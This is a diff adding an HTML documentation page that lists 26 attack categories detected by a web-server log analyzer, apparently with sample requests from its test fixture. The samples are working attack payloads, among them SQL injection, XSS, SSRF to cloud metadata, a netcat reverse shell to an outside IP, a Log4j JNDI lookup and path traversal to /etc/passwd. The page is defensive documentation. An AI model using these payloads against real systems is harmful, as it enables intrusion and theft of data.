@@ -1,0 +1,41 @@
+<!-- fm: title=26 Categories — caddy-analyzer | description=All 26 detection categories with confidence, description and a real fixture example — consistent triplet per row. | breadcrumb=Reference > 26 Categories -->
+<h1>26 Categories</h1>
+<p>Every row: <strong>confidence</strong> (the score of its fixture example), <strong>description</strong>, and a <strong>real example from <code>testdata/sample.log</code></strong> (not invented). All examples use TEST-NET IPs and are reproducible via <code>caddy-analyze --detect testdata/sample.log</code>. MITRE IDs verified in <a href="security-detection.html">MITRE &amp; Sigma</a>.</p>
+
+<div class="callout callout-info"><div class="callout-label">Confidence</div>Highest per-category patterns score 9–10 (e.g. <code>UNION SELECT</code>), heuristics score 6–7. Guard default <code>--detect-confidence 8</code> blocks only ≥8. Lowering it to 6 allows more pattern-based blocks; 0 disables only pattern-based blocks, not other guard controls. Behavioral categories (<code>ua_rotation</code>, <code>object_enumeration</code>, <code>beaconing</code>) need ≥10 samples.</div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>Category</th><th>Confidence</th><th>Description</th><th>Example (from fixture)</th><th>MITRE</th></tr></thead>
+<tbody>
+<tr><td>1</td><td><code>sql_injection</code></td><td>8</td><td>SQL keywords + tautology</td><td><code>/login.php?user=admin'+OR+'1'%3D'1'--+</code></td><td>T1190</td></tr>
+<tr><td>2</td><td><code>nosql_injection</code></td><td>8</td><td>MongoDB operators</td><td><code>/api/login?username[$ne]=invalid</code></td><td>T1190</td></tr>
+<tr><td>3</td><td><code>xss</code></td><td>8</td><td>Script tags, event handlers, JS URIs</td><td><code>/search?q=%3Cscript%3Ealert(1)%3C/script%3E</code></td><td>T1059.007, T1189</td></tr>
+<tr><td>4</td><td><code>ssti</code></td><td>8</td><td>Template probes (Jinja, FreeMarker)</td><td><code>/profile?name={{7*7}}</code></td><td>T1190</td></tr>
+<tr><td>5</td><td><code>ssrf</code></td><td>10</td><td>Cloud metadata, private IP, loopback</td><td><code>/fetch?url=http://169.254.169.254/latest/meta-data/</code></td><td>T1190</td></tr>
+<tr><td>6</td><td><code>rce</code></td><td>9</td><td>Shell, reverse shell, LOLBins, deserialization</td><td><code>/cgi-bin/bash?cmd=nc+-e+/bin/sh+185.220.101.5+4444</code></td><td>T1059, T1190</td></tr>
+<tr><td>7</td><td><code>path_traversal</code></td><td>8</td><td>Directory traversal, null byte, /proc, win.ini</td><td><code>/view?file=../../../../etc/passwd</code></td><td>T1083</td></tr>
+<tr><td>8</td><td><code>lfi_wrapper_abuse</code></td><td>9</td><td>PHP stream wrappers</td><td><code>/?file=php://filter/convert.base64-encode/resource=index.php</code></td><td>T1083, T1190</td></tr>
+<tr><td>9</td><td><code>graphql_introspection</code></td><td>8</td><td>Schema discovery queries</td><td><code>/graphql?query={__schema{types{...}}}</code></td><td>T1595.002</td></tr>
+<tr><td>10</td><td><code>log4j_jndi</code></td><td>10</td><td>JNDI lookup, env/sys access</td><td><code>User-Agent: ${jndi:ldap://evil.example.com/a}</code></td><td>T1190, T1059</td></tr>
+<tr><td>11</td><td><code>sensitive_file_probe</code></td><td>8</td><td>.env, git, id_rsa, dumps, .sql</td><td><code>/.env</code></td><td>T1083, T1552.001</td></tr>
+<tr><td>12</td><td><code>admin_probe</code></td><td>8</td><td>phpMyAdmin, Spring Actuator, H2, heapdump</td><td><code>/phpmyadmin/</code></td><td>T1595.002</td></tr>
+<tr><td>13</td><td><code>wordpress_probe</code></td><td>8</td><td>xmlrpc, wp-content, plugins</td><td><code>/xmlrpc.php?rsd</code></td><td>T1595.002</td></tr>
+<tr><td>14</td><td><code>cgi_probe</code></td><td>7</td><td>cgi-bin, .cgi/.pl/.fcgi</td><td><code>/cgi-bin/test.cgi</code></td><td>T1595.002</td></tr>
+<tr><td>15</td><td><code>scanner</code></td><td>9</td><td>30+ UA sigs (nikto, sqlmap, nuclei…)</td><td><code>User-Agent: nikto/2.5.0</code></td><td>T1595</td></tr>
+<tr><td>16</td><td><code>xxe</code></td><td>8</td><td>ENTITY SYSTEM, XInclude, jar://</td><td><code>/api/xml?xml=%3C!DOCTYPE+foo+[&lt;!ENTITY+xxe+SYSTEM+…</code></td><td>T1190</td></tr>
+<tr><td>17</td><td><code>open_redirect</code></td><td>7</td><td>?url=https://, //evil, @ bypass</td><td><code>/login?next=https://evil.example.com/</code></td><td>T1566.002</td></tr>
+<tr><td>18</td><td><code>ldap_injection</code></td><td>8</td><td>Filter chars (&amp;, |, (), *)</td><td><code>/search?filter=(uid=*))</code></td><td>T1190</td></tr>
+<tr><td>19</td><td><code>xpath_injection</code></td><td>7</td><td>XPath tautology, ]|//* </td><td><code>/search?q='%20OR%20'1'%3D'1</code></td><td>T1190</td></tr>
+<tr><td>20</td><td><code>crlf_injection</code></td><td>8</td><td>Set-Cookie/Location via %0d%0a + ghost bits</td><td><code>/redirect?to=/home%0d%0aSet-Cookie:%20evil=1</code></td><td>T1190, T1059</td></tr>
+<tr><td>21</td><td><code>prototype_pollution</code></td><td>8</td><td>__proto__ / constructor.prototype</td><td><code>/api/update?__proto__[isAdmin]=1</code></td><td>T1190, T1059.007</td></tr>
+<tr><td>22</td><td><code>ssi_injection</code></td><td>8</td><td>&lt;!--#exec cmd=, #include virtual=</td><td><code>/page?name=%3C!--%23exec+cmd=%22ls%22--%3E</code></td><td>T1190, T1059</td></tr>
+<tr><td>23</td><td><code>ua_rotation</code></td><td>6</td><td>≥10 distinct UAs from one IP (heuristic)</td><td><code>11 UAs on /?r=0…10 from 198.51.100.32</code></td><td>T1595.001</td></tr>
+<tr><td>24</td><td><code>jwt_abuse</code></td><td>10</td><td>alg:none, kid traversal, leaked token</td><td><code>Authorization: Bearer eyJhbGciOiJub25l…</code></td><td>T1550.001, T1190</td></tr>
+<tr><td>25</td><td><code>object_enumeration</code></td><td>7</td><td>Sequential IDs per path template (BOLA)</td><td><code>/api/users/1 … /api/users/15 from 198.51.100.35</code></td><td>T1595.002, T1190</td></tr>
+<tr><td>26</td><td><code>beaconing</code></td><td>6</td><td>Regular intervals per path, jitter CV&lt;0.25</td><td><code>/api/heartbeat every 60s ×12 from 198.51.100.36</code></td><td>T1071.001, T1573</td></tr>
+</tbody>
+</table></div>
+
+<p>All examples are from <code>testdata/sample.log</code> via <code>testdata/generate.py</code> (deterministic, TEST-NET). Verify locally: <code>caddy-analyze --detect testdata/sample.log</code> should fire all 26. Confidence shown is for that exact fixture payload; individual patterns currently range from 2–10 — see <a href="security-detection.html">evasion &amp; Sigma</a> for gate/markers.</p>
+
+<div class="callout callout-info"><div class="callout-label">No invented examples</div>Every example above was read from <code>testdata/generate.py</code> lines 107–217. If a future category has no fixture, this page will say “no fixture example yet” instead of inventing one.</div>
